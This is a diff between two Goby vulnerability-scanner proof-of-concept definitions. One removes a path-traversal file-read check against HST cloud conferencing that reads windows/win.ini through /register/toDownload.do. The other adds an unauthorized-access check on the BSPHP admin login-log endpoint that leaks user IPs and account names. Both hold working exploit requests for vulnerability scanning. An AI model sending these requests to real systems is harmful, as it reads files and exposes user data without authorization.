@@ -1,27 +1,21 @@
 {
-      "Name": "好视通云会议存在任意文件读取漏洞",
-      "Level": "2",
+      "Name": "BSPHP index.php unauthorized access information",
+      "Level": "3",
       "Tags": [
-            "fileread"
+            "infoleak"
       ],
-      "GobyQuery": "body=\"深圳银澎云计算有限公司\"",
-      "Description": "好视通云会议存在任意文件读取漏洞",
-      "Product": "好视通云会议",
-      "Homepage": "https://www.hst.com/",
-      "Author": "aetkrad",
+      "GobyQuery": "header=\"Pragma\"",
+      "Description": "BSPHP 存在未授权访问 泄露用户 IP 和 账户名信息",
+      "Product": "",
+      "Homepage": "https://gobies.org/",
+      "Author": "gobysec@gmail.com",
       "Impact": "",
       "Recommendation": "",
       "References": [
-            "https://mp.weixin.qq.com/s/fMNE1PF5n81O1BpoDRlYkA"
+            "https://gobies.org/"
       ],
       "HasExp": true,
-      "ExpParams": [
-            {
-                  "Name": "Filepath",
-                  "Type": "input",
-                  "Value": "../../../../../../../../../../../../../../windows/win.ini"
-            }
-      ],
+      "ExpParams": null,
       "ExpTips": {
             "Type": "",
             "Content": ""
@@ -31,9 +25,11 @@
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini",
-                        "follow_redirect": false,
-                        "header": null,
+                        "uri": "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
+                        },
                         "data_type": "text",
                         "data": "",
                         "set_variable": []
@@ -53,14 +49,7 @@
                                     "type": "item",
                                     "variable": "$body",
                                     "operation": "contains",
-                                    "value": "[fonts]",
-                                    "bz": ""
-                              },
-                              {
-                                    "type": "item",
-                                    "variable": "$body",
-                                    "operation": "contains",
-                                    "value": "[extensions]",
+                                    "value": "user",
                                     "bz": ""
                               }
                         ]
@@ -75,9 +64,11 @@
             {
                   "Request": {
                         "method": "GET",
-                        "uri": "/register/toDownload.do?fileName={{{Filepath}}}",
-                        "follow_redirect": false,
-                        "header": null,
+                        "uri": "/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0'",
+                        "follow_redirect": true,
+                        "header": {
+                              "User-Agent": "Mozilla/5.0(X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0"
+                        },
                         "data_type": "text",
                         "data": "",
                         "set_variable": []
@@ -92,14 +83,21 @@
                                     "operation": "==",
                                     "value": "200",
                                     "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "user",
+                                    "bz": ""
                               }
                         ]
                   },
                   "SetVariable": [
-                        "output|lastbody||"
+                        "output|lastbody|regex|"
                   ]
             }
       ],
-      "PostTime": "2021-12-11 14:50:39",
-      "GobyVersion": "1.9.310"
+      "PostTime": "2022-06-01 23:48:04",
+      "GobyVersion": "1.9.325"
 }
